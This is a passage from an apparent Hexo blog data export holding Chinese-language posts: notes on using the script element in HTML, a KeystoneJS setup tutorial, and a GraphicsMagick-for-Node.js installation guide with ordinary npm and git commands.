概述\n第2章，使用`<script>`元素，嵌入脚本与外部脚本，文档模式对JS的影响，考虑禁用JS的场景。\n<!-- more -->\n\n# 详述\n\n## 具体知识点如下：\n\n+ 使用`<script>`元素，src属性引用外部脚本，async属性异步加载立即执行，defer属性异步加载延迟执行，对于defer目前不能保证延迟顺序执行（HTML5标准规定顺序执行）。\n\n+ 嵌入脚本，不能在代码任何地方出现`</script>`字符串，需要转义，如下：\n```html\n<script type=\"text/javascript\">\nfunction sayScript(){\nalert(\"<\\/script>\");\n}\n</script>\n```\n+ XHTML中嵌入脚本不能直接用大小写符号\"<\"和\">\"，兼容写法如下：\n```html\n<script type=\"text/javascript\">\n//<![CDATA[\nfunction compare(a, b) {\nif (a < b) {\nalert(\"A is less than B\");\n} else if (a > b) {\nalert(\"A is greater than B\");\n} else {\nalert(\"A is equal to B\");\n}\n}\n//]]>\n</script>\n```\n\n+ 使用`<noscript>`元素，其中内容只在以下两种情况下显示：浏览器不支持脚本；浏览器支持脚本，但脚本被禁用。\n\n## 最佳实践\n用`<script>`元素引入外部脚本，位置放在`</body>`元素前面。首先引入外部脚本容易维护，可换成，避免嵌入脚本转义大小写符号等额外处理；其次放在`</body>`前面不会阻塞dom渲染，也避免脚本执行时操作的某个dom元素不存在；最后也可以实现顺序执行脚本。\n# 后记\n记住“最佳实践”足以。","source":"_posts/2018/2018-12-19-JS高设3版-2.md","raw":"---\ntitle: 在HTML中使用JavaScript（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记  \ncategories:\n  - 前端\ndate: 2018-12-19 11:51:41\nupdated: 2018-12-19 11:51:41\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n第2章，使用`<script>`元素，嵌入脚本与外部脚本，文档模式对JS的影响，考虑禁用JS的场景。\n<!-- more -->\n\n# 详述\n\n## 具体知识点如下：\n\n+ 使用`<script>`元素，src属性引用外部脚本，async属性异步加载立即执行，defer属性异步加载延迟执行，对于defer目前不能保证延迟顺序执行（HTML5标准规定顺序执行）。\n\n+ 嵌入脚本，不能在代码任何地方出现`</script>`字符串，需要转义，如下：\n```html\n<script type=\"text/javascript\">\nfunction sayScript(){\nalert(\"<\\/script>\");\n}\n</script>\n```\n+ XHTML中嵌入脚本不能直接用大小写符号\"<\"和\">\"，兼容写法如下：\n```html\n<script type=\"text/javascript\">\n//<![CDATA[\nfunction compare(a, b) {\nif (a < b) {\nalert(\"A is less than B\");\n} else if (a > b) {\nalert(\"A is greater than B\");\n} else {\nalert(\"A is equal to B\");\n}\n}\n//]]>\n</script>\n```\n\n+ 使用`<noscript>`元素，其中内容只在以下两种情况下显示：浏览器不支持脚本；浏览器支持脚本，但脚本被禁用。\n\n## 最佳实践\n用`<script>`元素引入外部脚本，位置放在`</body>`元素前面。首先引入外部脚本容易维护，可换成，避免嵌入脚本转义大小写符号等额外处理；其次放在`</body>`前面不会阻塞dom渲染，也避免脚本执行时操作的某个dom元素不存在；最后也可以实现顺序执行脚本。\n# 后记\n记住“最佳实践”足以。","slug":"2018-2018-12-19-JS高设3版-2","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8r7001lwovviw54cabk","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>第2章，使用<code>&lt;script&gt;</code>元素，嵌入脚本与外部脚本，文档模式对JS的影响，考虑禁用JS的场景。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"具体知识点如下：\"><a href=\"#具体知识点如下：\" class=\"headerlink\" title=\"具体知识点如下：\"></a>具体知识点如下：</h2><ul>\n<li><p>使用<code>&lt;script&gt;</code>元素，src属性引用外部脚本，async属性异步加载立即执行，defer属性异步加载延迟执行，对于defer目前不能保证延迟顺序执行（HTML5标准规定顺序执行）。</p>\n</li>\n<li><p>嵌入脚本，不能在代码任何地方出现<code>&lt;/script&gt;</code>字符串，需要转义，如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sayScript</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"&lt;\\/script&gt;\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>XHTML中嵌入脚本不能直接用大小写符号”&lt;”和”&gt;”，兼容写法如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//&lt;![CDATA[</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compare</span>(<span class=\"params\">a, b</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">if</span> (a &lt; b) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"A is less than B\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a &gt; b) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"A is greater than B\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"A is equal to B\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//]]&gt;</span></span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>&lt;noscript&gt;</code>元素，其中内容只在以下两种情况下显示：浏览器不支持脚本；浏览器支持脚本，但脚本被禁用。</p>\n</li>\n</ul>\n<h2 id=\"最佳实践\"><a href=\"#最佳实践\" class=\"headerlink\" title=\"最佳实践\"></a>最佳实践</h2><p>用<code>&lt;script&gt;</code>元素引入外部脚本，位置放在<code>&lt;/body&gt;</code>元素前面。首先引入外部脚本容易维护，可换成，避免嵌入脚本转义大小写符号等额外处理；其次放在<code>&lt;/body&gt;</code>前面不会阻塞dom渲染，也避免脚本执行时操作的某个dom元素不存在；最后也可以实现顺序执行脚本。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>记住“最佳实践”足以。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>第2章，使用<code>&lt;script&gt;</code>元素，嵌入脚本与外部脚本，文档模式对JS的影响，考虑禁用JS的场景。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"具体知识点如下：\"><a href=\"#具体知识点如下：\" class=\"headerlink\" title=\"具体知识点如下：\"></a>具体知识点如下：</h2><ul>\n<li><p>使用<code>&lt;script&gt;</code>元素，src属性引用外部脚本，async属性异步加载立即执行，defer属性异步加载延迟执行，对于defer目前不能保证延迟顺序执行（HTML5标准规定顺序执行）。</p>\n</li>\n<li><p>嵌入脚本，不能在代码任何地方出现<code>&lt;/script&gt;</code>字符串，需要转义，如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sayScript</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"&lt;\\/script&gt;\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>XHTML中嵌入脚本不能直接用大小写符号”&lt;”和”&gt;”，兼容写法如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//&lt;![CDATA[</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compare</span>(<span class=\"params\">a, b</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">if</span> (a &lt; b) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"A is less than B\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a &gt; b) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"A is greater than B\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">\"A is equal to B\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//]]&gt;</span></span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>&lt;noscript&gt;</code>元素，其中内容只在以下两种情况下显示：浏览器不支持脚本；浏览器支持脚本，但脚本被禁用。</p>\n</li>\n</ul>\n<h2 id=\"最佳实践\"><a href=\"#最佳实践\" class=\"headerlink\" title=\"最佳实践\"></a>最佳实践</h2><p>用<code>&lt;script&gt;</code>元素引入外部脚本，位置放在<code>&lt;/body&gt;</code>元素前面。首先引入外部脚本容易维护，可换成，避免嵌入脚本转义大小写符号等额外处理；其次放在<code>&lt;/body&gt;</code>前面不会阻塞dom渲染，也避免脚本执行时操作的某个dom元素不存在；最后也可以实现顺序执行脚本。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>记住“最佳实践”足以。</p>"},{"title":"（入门）keystonejs入门教程之环境搭建","date":"2018-04-09T09:30:15.000Z","_content":"## 基础环境 ##\nNode.js 0.10+ 和MongoDB v2.4+；\n## 基础知识 ##\njavascript，nodejs，npm，数据库，cms；\n## 执行命令 ##\n\n - 安装脚手架\n```\nnpm install -g generator-keystone\n```\n - 创建项目并进入目录\n\n```\nmkdir my-test-project\ncd my-test-project\n```\n\n - 安装Yeoman（脚手架是用Yeoman制作的）\n\n```\nnpm install -g yo\n```\n\n - 运行脚手架\n\n```\nyo keystone\n```\n\n----------\n环境搭建完成\n----------\n\n\n## 启动 ##\n\n```\nnode keystone\n```\n## 访问 ##\n前台页面\n[http://localhost:3000][1]\n后台页面\n[http://localhost:3000/keystone][2]\n\n\n----------\n\n\n## 备注 ##\n\n 1. 管理员权限，数据库连接等[常见问题][3]；\n 2. 后台登录用户名密码是运行脚手架时输入的，默认是user@keystonejs.com/admin；\n 3. windows下安装MongoDB卡死问题，原因是默认安装mongodb compass（比较大）所致，因此安装时选择自定义custom，过程中取消mongodb compass的安装勾选，需要的可以单独安装；\n 4. [keystonejs官方网站][4]\n\n\n  [1]: http://localhost:3000\n  [2]: http://localhost:3000/keystone\n  [3]: http://keystonejs.com/getting-started/\n  [4]: http://keystonejs.com/","source":"_posts/2018/keystonejs入门教程之环境搭建.md","raw":"---\ntitle: （入门）keystonejs入门教程之环境搭建\ndate: 2018-04-09 17:30:15\ntags:\n  - keystonejs\n  - cms\ncategories:\n  - 后端\n---\n## 基础环境 ##\nNode.js 0.10+ 和MongoDB v2.4+；\n## 基础知识 ##\njavascript，nodejs，npm，数据库，cms；\n## 执行命令 ##\n\n - 安装脚手架\n```\nnpm install -g generator-keystone\n```\n - 创建项目并进入目录\n\n```\nmkdir my-test-project\ncd my-test-project\n```\n\n - 安装Yeoman（脚手架是用Yeoman制作的）\n\n```\nnpm install -g yo\n```\n\n - 运行脚手架\n\n```\nyo keystone\n```\n\n----------\n环境搭建完成\n----------\n\n\n## 启动 ##\n\n```\nnode keystone\n```\n## 访问 ##\n前台页面\n[http://localhost:3000][1]\n后台页面\n[http://localhost:3000/keystone][2]\n\n\n----------\n\n\n## 备注 ##\n\n 1. 管理员权限，数据库连接等[常见问题][3]；\n 2. 后台登录用户名密码是运行脚手架时输入的，默认是user@keystonejs.com/admin；\n 3. windows下安装MongoDB卡死问题，原因是默认安装mongodb compass（比较大）所致，因此安装时选择自定义custom，过程中取消mongodb compass的安装勾选，需要的可以单独安装；\n 4. [keystonejs官方网站][4]\n\n\n  [1]: http://localhost:3000\n  [2]: http://localhost:3000/keystone\n  [3]: http://keystonejs.com/getting-started/\n  [4]: http://keystonejs.com/","slug":"2018-keystonejs入门教程之环境搭建","published":1,"updated":"2019-05-17T02:47:05.780Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8rc001nwovvzrr9czvh","content":"<h2 id=\"基础环境\"><a href=\"#基础环境\" class=\"headerlink\" title=\"基础环境\"></a>基础环境</h2><p>Node.js 0.10+ 和MongoDB v2.4+；</p>\n<h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><p>javascript，nodejs，npm，数据库，cms；</p>\n<h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><ul>\n<li><p>安装脚手架</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g generator-keystone</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建项目并进入目录</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir my-test-project</span><br><span class=\"line\">cd my-test-project</span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装Yeoman（脚手架是用Yeoman制作的）</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g yo</span><br></pre></td></tr></table></figure>\n<ul>\n<li>运行脚手架</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yo keystone</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"环境搭建完成\"><a href=\"#环境搭建完成\" class=\"headerlink\" title=\"环境搭建完成\"></a>环境搭建完成</h2><h2 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node keystone</span><br></pre></td></tr></table></figure>\n<h2 id=\"访问\"><a href=\"#访问\" class=\"headerlink\" title=\"访问\"></a>访问</h2><p>前台页面<br><a href=\"http://localhost:3000\" target=\"_blank\" rel=\"noopener\">http://localhost:3000</a><br>后台页面<br><a href=\"http://localhost:3000/keystone\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/keystone</a></p>\n<hr>\n<h2 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h2><ol>\n<li>管理员权限，数据库连接等<a href=\"http://keystonejs.com/getting-started/\" target=\"_blank\" rel=\"noopener\">常见问题</a>；</li>\n<li>后台登录用户名密码是运行脚手架时输入的，默认是<a href=\"mailto:user@keystonejs.com\" target=\"_blank\" rel=\"noopener\">user@keystonejs.com</a>/admin；</li>\n<li>windows下安装MongoDB卡死问题，原因是默认安装mongodb compass（比较大）所致，因此安装时选择自定义custom，过程中取消mongodb compass的安装勾选，需要的可以单独安装；</li>\n<li><a href=\"http://keystonejs.com/\" target=\"_blank\" rel=\"noopener\">keystonejs官方网站</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"基础环境\"><a href=\"#基础环境\" class=\"headerlink\" title=\"基础环境\"></a>基础环境</h2><p>Node.js 0.10+ 和MongoDB v2.4+；</p>\n<h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><p>javascript，nodejs，npm，数据库，cms；</p>\n<h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><ul>\n<li><p>安装脚手架</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g generator-keystone</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建项目并进入目录</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir my-test-project</span><br><span class=\"line\">cd my-test-project</span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装Yeoman（脚手架是用Yeoman制作的）</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g yo</span><br></pre></td></tr></table></figure>\n<ul>\n<li>运行脚手架</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yo keystone</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"环境搭建完成\"><a href=\"#环境搭建完成\" class=\"headerlink\" title=\"环境搭建完成\"></a>环境搭建完成</h2><h2 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node keystone</span><br></pre></td></tr></table></figure>\n<h2 id=\"访问\"><a href=\"#访问\" class=\"headerlink\" title=\"访问\"></a>访问</h2><p>前台页面<br><a href=\"http://localhost:3000\" target=\"_blank\" rel=\"noopener\">http://localhost:3000</a><br>后台页面<br><a href=\"http://localhost:3000/keystone\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/keystone</a></p>\n<hr>\n<h2 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h2><ol>\n<li>管理员权限，数据库连接等<a href=\"http://keystonejs.com/getting-started/\" target=\"_blank\" rel=\"noopener\">常见问题</a>；</li>\n<li>后台登录用户名密码是运行脚手架时输入的，默认是<a href=\"mailto:user@keystonejs.com\" target=\"_blank\" rel=\"noopener\">user@keystonejs.com</a>/admin；</li>\n<li>windows下安装MongoDB卡死问题，原因是默认安装mongodb compass（比较大）所致，因此安装时选择自定义custom，过程中取消mongodb compass的安装勾选，需要的可以单独安装；</li>\n<li><a href=\"http://keystonejs.com/\" target=\"_blank\" rel=\"noopener\">keystonejs官方网站</a></li>\n</ol>\n"},{"title":"GraphicsMagick for node.js环境搭建","date":"2017-07-12T08:52:41.000Z","_content":"\n\n## 本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；\n\n## 具体步骤如下：\n1. 下载[GraphicsMagick](ftp://ftp.graphicsmagick.org/pub/GraphicsMagick/windows/)，一路Next完成安装，然后cmd调用命令窗口输入gm回车，如果能正确显示类似如下信息说明安装成功：\n```     \n    H:\\workspace\\gm\\examples>gm\n\n    GraphicsMagick 1.3.26 2017-07-04 Q16 http://www.GraphicsMagick.org/\n    Copyright (C) 2002-2017 GraphicsMagick Group.\n    Additional copyrights and licenses apply to this software.\n    See http://www.GraphicsMagick.org/www/Copyright.html for details.\n    Usage: gm command [options ...]\n\n    Where commands include:\n        batch - issue multiple commands in interactive or batch mode\n    benchmark - benchmark one of the other commands\n        compare - compare two images\n    composite - composite images together\n        conjure - execute a Magick Scripting Language (MSL) XML script\n        convert - convert an image or sequence of images\n        help - obtain usage message for named command\n    identify - describe an image or image sequence\n        mogrify - transform an image or sequence of images\n        montage - create a composite image (in a grid) from separate im\n        time - time one of the other commands\n        version - obtain release version\n    register - register this application as the source of messages           \n```\n2. 如果只是学习可以cmd命令窗口执行`git clone git://github.com/aheckmann/gm.git`，然后到该目录下执行`npm install`完成相关依赖包安装后就可以到examples下试试各种demo了，例如我的执行:\n\n```\n    H:\\workspace\\gm\\examples>node append\n\n    H:\\workspace\\gm\\examples/imgs/append.jpg created  ::  gm \"convert\"\n    \"#222\" \"H:\\workspace\\gm\\examples/imgs/lost.png\" \"H:\\workspace\\gm\\e\n    original.jpg\" \"-append\" \"H:\\workspace\\gm\\examples/imgs/append.jpg\"\n```\n\n3. 如果从零开始，实际示例如下：\n         \n    创建根目录:\n\n            mkdir gm-study\n\n    到该目录下:\n\n            cd gm-study\n\n    初始化创建package.json:\n\n            npm init\n\n    安装gm:\n\n            npm install gm --save\n\n    创建执行文件:\n\n            type nul>index.js\n\n    打开index.js并黏贴[gm](https://github.com/aheckmann/gm)官方示例代码并修改路径:\n        \n        var fs = require('fs')\n        , gm = require('gm');\n\n        // resize and remove EXIF profile data\n        gm('imgs/1.jpg')\n        .resize(240, 240)\n        .noProfile()\n        .write('out/resize.png', function (err) {\n        if (!err) console.log('done');\n        });\n        \n    执行node命令:\n\n        node index\n\n","source":"_posts/2018/gm-1.md","raw":"---\ntitle: GraphicsMagick for node.js环境搭建\ndate: 2017-07-12 16:52:41\ntags: [gm]\ncategories: [其他]\n---\n\n\n## 本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；\n\n## 具体步骤如下：\n1. 下载[GraphicsMagick](ftp://ftp.graphicsmagick.org/pub/GraphicsMagick/windows/)，一路Next完成安装，然后cmd调用命令窗口输入gm回车，如果能正确显示类似如下信息说明安装成功：\n```     \n    H:\\workspace\\gm\\examples>gm\n\n    GraphicsMagick 1.3.26 2017-07-04 Q16 http://www.GraphicsMagick.org/\n    Copyright (C) 2002-2017 GraphicsMagick Group.\n    Additional copyrights and licenses apply to this software.\n    See http://www.GraphicsMagick.org/www/Copyright.html for details.\n    Usage: gm command [options ...]\n\n    Where commands include:\n        batch - issue multiple commands in interactive or batch mode\n    benchmark - benchmark one of the other commands\n        compare - compare two images\n    composite - composite images together\n        conjure - execute a Magick Scripting Language (MSL) XML script\n        convert - convert an image or sequence of images\n        help - obtain usage message for named command\n    identify - describe an image or image sequence\n        mogrify - transform an image or sequence of images\n        montage - create a composite image (in a grid) from separate im\n        time - time one of the other commands\n        version - obtain release version\n    register - register this application as the source of messages           \n```\n2. 如果只是学习可以cmd命令窗口执行`git clone git://github.com/aheckmann/gm.git`，然后到该目录下执行`npm install`完成相关依赖包安装后就可以到examples下试试各种demo了，例如我的执行:\n\n```\n    H:\\workspace\\gm\\examples>node append\n\n    H:\\workspace\\gm\\examples/imgs/append.jpg created  ::  gm \"convert\"\n    \"#222\" \"H:\\workspace\\gm\\examples/imgs/lost.png\" \"H:\\workspace\\gm\\e\n    original.jpg\" \"-append\" \"H:\\workspace\\gm\\examples/imgs/append.jpg\"\n```\n\n3. 如果从零开始，实际示例如下：\n         \n    创建根目录:\n\n            mkdir gm-study\n\n    到该目录下:\n\n            cd gm-study\n\n    初始化创建package.json:\n\n            npm init\n\n    安装gm:\n\n            npm install gm --save\n\n    创建执行文件:\n\n            type nul>index.js\n\n    打开index.js并黏贴[gm](https://github.com/aheckmann/gm)官方示例代码并修改路径:\n        \n        var fs = require('fs')\n        , gm = require('gm');\n\n        // resize and remove EXIF profile data\n        gm('imgs/1.jpg')\n        .resize(240, 240)\n        .noProfile()\n        .write('out/resize.png', function (err) {\n        if (!err) console.log('done');\n        });\n        \n    执行node命令:\n\n        node index\n\n","slug":"2018-gm-1","published":1,"updated":"2019-05-17T02:47:34.650Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8rg001qwovvhmmwm3aa","content":"<h2 id=\"本人背景环境windows7-64位，nodejs-v6-11-0，git-version-2-7-2-windows-1；\"><a href=\"#本人背景环境windows7-64位，nodejs-v6-11-0，git-version-2-7-2-windows-1；\" class=\"headerlink\" title=\"本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；\"></a>本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；</h2><h2 id=\"具体步骤如下：\"><a href=\"#具体步骤如下：\" class=\"headerlink\" title=\"具体步骤如下：\"></a>具体步骤如下：</h2><ol>\n<li><p>下载<a href=\"ftp://ftp.graphicsmagick.org/pub/GraphicsMagick/windows/\" target=\"_blank\" rel=\"noopener\">GraphicsMagick</a>，一路Next完成安装，然后cmd调用命令窗口输入gm回车，如果能正确显示类似如下信息说明安装成功：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">H:\\workspace\\gm\\examples&gt;gm</span><br><span class=\"line\"></span><br><span class=\"line\">GraphicsMagick 1.3.26 2017-07-04 Q16 http://www.GraphicsMagick.org/</span><br><span class=\"line\">Copyright (C) 2002-2017 GraphicsMagick Group.</span><br><span class=\"line\">Additional copyrights and licenses apply to this software.</span><br><span class=\"line\">See http://www.GraphicsMagick.org/www/Copyright.html for details.</span><br><span class=\"line\">Usage: gm command [options ...]</span><br><span class=\"line\"></span><br><span class=\"line\">Where commands include:</span><br><span class=\"line\">    batch - issue multiple commands in interactive or batch mode</span><br><span class=\"line\">benchmark - benchmark one of the other commands</span><br><span class=\"line\">    compare - compare two images</span><br><span class=\"line\">composite - composite images together</span><br><span class=\"line\">    conjure - execute a Magick Scripting Language (MSL) XML script</span><br><span class=\"line\">    convert - convert an image or sequence of images</span><br><span class=\"line\">    help - obtain usage message for named command</span><br><span class=\"line\">identify - describe an image or image sequence</span><br><span class=\"line\">    mogrify - transform an image or sequence of images</span><br><span class=\"line\">    montage - create a composite image (in a grid) from separate im</span><br><span class=\"line\">    time - time one of the other commands</span><br><span class=\"line\">    version - obtain release version</span><br><span class=\"line\">register - register this application as the source of messages</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果只是学习可以cmd命令窗口执行<code>git clone git://github.com/aheckmann/gm.git</code>，然后到该目录下执行<code>npm install</code>完成相关依赖包安装后就可以到examples下试试各种demo了，例如我的执行:</p>\n</li>\n</ol>\n<figure 